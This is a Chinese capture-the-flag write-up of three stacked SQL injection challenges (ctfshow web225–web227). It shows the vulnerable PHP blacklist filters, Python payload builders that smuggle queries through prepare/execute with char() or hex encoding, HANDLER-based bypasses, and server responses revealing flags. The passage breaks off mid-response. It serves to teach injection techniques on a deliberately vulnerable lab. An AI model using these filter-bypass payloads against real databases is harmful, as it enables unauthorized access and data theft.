<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的堆叠注入，可以利用预处理或 handler，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107823398">文章</a>。    </p>
<h3 id="预处理解法"><a href="#预处理解法" class="headerlink" title="预处理解法"></a>预处理解法</h3><p>concat 和 char 都可以绕过过滤。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;ctfshow&#x27;;prepare n from char(<span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> sql)&#125;</span>);execute n%23&quot;</span></span><br></pre></td></tr></table></figure>
<p>payload1: <code>make_payload(&quot;show tables;&quot;)</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Tables_in_ctfshow_web&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow_flagasa&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Tables_in_ctfshow_web&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow_user&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>make_payload(&quot;select * from ctfshow_flagasa;&quot;)</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;flagas&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;info&quot;</span><span class="punctuation">:</span><span class="string">&quot;you get it&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="handler-解法"><a href="#handler-解法" class="headerlink" title="handler 解法"></a>handler 解法</h3><p>payload1: <code>ctfshow&#39;;show tables%23</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Tables_in_ctfshow_web&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow_flagasa&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Tables_in_ctfshow_web&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow_user&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>ctfshow&#39;;handler ctfshow_flagasa open as t;handler t read first;handler t close%23</code>   </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;flagas&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;info&quot;</span><span class="punctuation">:</span><span class="string">&quot;you get it&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的堆叠注入，和上题相比禁用了 <code>show (</code>，concat 或 char 函数可以用 0x 代替，就可以继续预处理了。<br>至于 handler，也需要出表名，没弄出来就只用预处理了。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;user1&#x27;;prepare n from 0x<span class="subst">&#123;sql.encode().<span class="built_in">hex</span>()&#125;</span>;execute n%23&quot;</span></span><br></pre></td></tr></table></figure>
<p>payload1: <code>make_payload(&quot;show tables;&quot;)</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;user1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;111&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Tables_in_ctfshow_web&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfsh_ow_flagas&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Tables_in_ctfshow_web&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow_user&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload2: <code>make_payload(&quot;select * from ctfsh_ow_flagas;&quot;)</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;user1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;111&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;flagasb&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow&#123;c09680e6-42ea-4b36-93fd-bd8b47c23002&#125;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;info&quot;</span><span class="punctuation">:</span><span class="string">&quot;you get it&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的堆叠注入，预处理还是可以用，但是就是找不到 flag，传了 shell 也没找到。后来知道了这题的考点是<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">查看MySQL的存储过程</a>。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;user1&#x27;;prepare n from 0x<span class="subst">&#123;sql.encode().<span class="built_in">hex</span>()&#125;</span>;execute n%23&quot;</span></span><br></pre></td></tr></table></figure>
<p>payload: <code>make_payload(&quot;select * from information_schema.routines;&quot;)</code>    </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;user1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;111&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;SPECIFIC_NAME&quot;</span><span class="punctuation">:</span><span class="string">&quot;getFlag&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_CATALOG&quot;</span><span class="punctuation">:</span><span class="string">&quot;def&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_SCHEMA&quot;</span><span class="punctuation">:</span><span class="string">&quot;ctfshow_web&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_NAME&quot;</span><span class="punctuation">:</span><span class="string">&quot;getFlag&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;PROCEDURE&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DATA_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_MAXIMUM_LENGTH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_OCTET_LENGTH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;NUMERIC_PRECISION&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;NUMERIC_SCALE&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;DATETIME_PRECISION&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_SET_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;COLLATION_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;DTD_IDENTIFIER&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_BODY&quot;</span><span class="punctuation">:</span><span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_DEFINITION&quot;</span><span class="punctuation">:</span><span class="string">&quot;BEGIN\n\tSELECT \&quot;ctfshow&#123;a697fb41-7a92-40d5-a50c-4cc17ba75fb7&#125;\&quot;;\n\tEND&quot;</span><span class="punctuation">,</span><span class="attr">&quot;EXTERNAL_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;EXTERNAL_LANGUAGE&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;PARAMETER_STYLE&quot;</span><span class="punctuation">:</span><span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IS_DETERMINISTIC&quot;</span><span class="punctuation">:</span><span class="string">&quot;NO&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_DATA_ACCESS&quot;</span><span class="punctuation">:</span><span class="string">&quot;CONTAINS SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_PATH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;SECURITY_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;DEFINER&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CREATED&quot;</span><span class="punctuation">:</span><span class="string">&quot;2021-07-28 14:42:39&quot;</span><span class="punctuation">,</span><span class="attr">&quot;LAST_ALTERED&quot;</span><span class="punctuation">:</span><span class="string">&quot;2021-07-28 14:42:39&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_MODE&quot;</span><span class="punctuation">:</span><span class="string">&quot;STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_COMMENT&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DEFINER&quot;</span><span class="punctuation">:</span><span class="string">&quot;root@localhost&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_SET_CLIENT&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;COLLATION_CONNECTION&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8_general_ci&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DATABASE_COLLATION&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8mb4_general_ci&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;SPECIFIC_NAME&quot;</span><span class="punctuation">:</span><span class="string">&quot;AddGeometryColumn&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_CATALOG&quot;</span><span class="punctuation">:</span><span class="string">&quot;def&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_SCHEMA&quot;</span><span class="punctuation">:</span><span class="string">&quot;mysql&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_NAME&quot;</span><span class="punctuation">:</span><span class="string">&quot;AddGeometryColumn&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;PROCEDURE&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DATA_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_MAXIMUM_LENGTH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_OCTET_LENGTH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;NUMERIC_PRECISION&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;NUMERIC_SCALE&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;DATETIME_PRECISION&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_SET_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;COLLATION_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;DTD_IDENTIFIER&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_BODY&quot;</span><span class="punctuation">:</span><span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_DEFINITION&quot;</span><span class="punctuation">:</span><span class="string">&quot;begin\n  set @qwe= concat(&#x27;ALTER TABLE &#x27;, t_schema, &#x27;.&#x27;, t_name, &#x27; ADD &#x27;, geometry_column,&#x27; GEOMETRY REF_SYSTEM_ID=&#x27;, t_srid); PREPARE ls from @qwe; execute ls; deallocate prepare ls; end&quot;</span><span class="punctuation">,</span><span class="attr">&quot;EXTERNAL_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;EXTERNAL_LANGUAGE&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;PARAMETER_STYLE&quot;</span><span class="punctuation">:</span><span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IS_DETERMINISTIC&quot;</span><span class="punctuation">:</span><span class="string">&quot;NO&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_DATA_ACCESS&quot;</span><span class="punctuation">:</span><span class="string">&quot;CONTAINS SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_PATH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;SECURITY_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;INVOKER&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CREATED&quot;</span><span class="punctuation">:</span><span class="string">&quot;2019-10-31 04:15:22&quot;</span><span class="punctuation">,</span><span class="attr">&quot;LAST_ALTERED&quot;</span><span class="punctuation">:</span><span class="string">&quot;2019-10-31 04:15:22&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_MODE&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_COMMENT&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DEFINER&quot;</span><span class="punctuation">:</span><span class="string">&quot;root@localhost&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_SET_CLIENT&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;COLLATION_CONNECTION&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8_general_ci&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DATABASE_COLLATION&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8mb4_general_ci&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;SPECIFIC_NAME&quot;</span><span class="punctuation">:</span><span class="string">&quot;DropGeometryColumn&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_CATALOG&quot;</span><span class="punctuation">:</span><span class="string">&quot;def&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_SCHEMA&quot;</span><span class="punctuation">:</span><span class="string">&quot;mysql&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_NAME&quot;</span><span class="punctuation">:</span><span class="string">&quot;DropGeometryColumn&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;PROCEDURE&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DATA_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_MAXIMUM_LENGTH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_OCTET_LENGTH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;NUMERIC_PRECISION&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;NUMERIC_SCALE&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;DATETIME_PRECISION&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_SET_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;COLLATION_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;DTD_IDENTIFIER&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_BODY&quot;</span><span class="punctuation">:</span><span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_DEFINITION&quot;</span><span class="punctuation">:</span><span class="string">&quot;begin\n  set @qwe= concat(&#x27;ALTER TABLE &#x27;, t_schema, &#x27;.&#x27;, t_name, &#x27; DROP &#x27;, geometry_column); PREPARE ls from @qwe; execute ls; deallocate prepare ls; end&quot;</span><span class="punctuation">,</span><span class="attr">&quot;EXTERNAL_NAME&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;EXTERNAL_LANGUAGE&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;PARAMETER_STYLE&quot;</span><span class="punctuation">:</span><span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IS_DETERMINISTIC&quot;</span><span class="punctuation">:</span><span class="string">&quot;NO&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_DATA_ACCESS&quot;</span><span class="punctuation">:</span><span class="string">&quot;CONTAINS SQL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_PATH&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;SECURITY_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;INVOKER&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CREATED&quot;</span><span class="punctuation">:</span><span class="string">&quot;2019-10-31 04:15:22&quot;</span><span class="punctuation">,</span><span class="attr">&quot;LAST_ALTERED&quot;</span><span class="punctuation">:</span><span class="string">&quot;2019-10-31 04:15:22&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SQL_MODE&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ROUTINE_COMMENT&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DEFINER&quot;</span><span class="punctuation">:</span><span class="string">&quot;root@localhost&quot;</span><span class="punctuation">,</span><span class="attr">&quot;CHARACTER_SET_CLIENT&quot;</span><span 